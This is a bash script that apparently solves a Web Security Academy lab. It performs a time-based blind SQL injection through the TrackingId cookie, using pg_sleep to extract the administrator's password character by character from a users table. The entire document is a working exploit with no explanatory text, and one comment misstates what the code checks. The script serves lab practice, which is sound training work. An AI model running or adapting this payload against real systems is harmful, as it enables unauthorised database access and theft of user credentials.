#!/bin/bash 

value=""

for j in {1..23};do
	for i in {a..z} {0..9};do
		start_time=$(date +%s.%N)
		response_time=$(	curl -s -H "Cookie: TrackingId=wj82n7fkG11JEvqY' || (SELECT CASE WHEN (username = 'administrator' and substring(password,$j,1) = '$i') THEN pg_sleep(5) ELSE pg_sleep(0) END from users)--; session=VV98KvwrdGaisHtVZrwOwf1unNPmPE19"  https://0a6f007f037e9b1781c968f7002200a0.web-security-academy.net/ -o /dev/null --proxy localhost:8080 -k -w "%{time_total}")
		end_time=$(date +%s.%N)

		# Calculate the difference between start and end times
		response_time=$(echo "$end_time - $start_time" | bc)

		echo "Response time: $response_time seconds"

		# Check if the response time is less than 10 seconds and echo "hello"
		if (( $(echo "$response_time > 3" | bc -l) )); then
		    value=$value$i
		    echo $value
		fi
	done
done
echo $value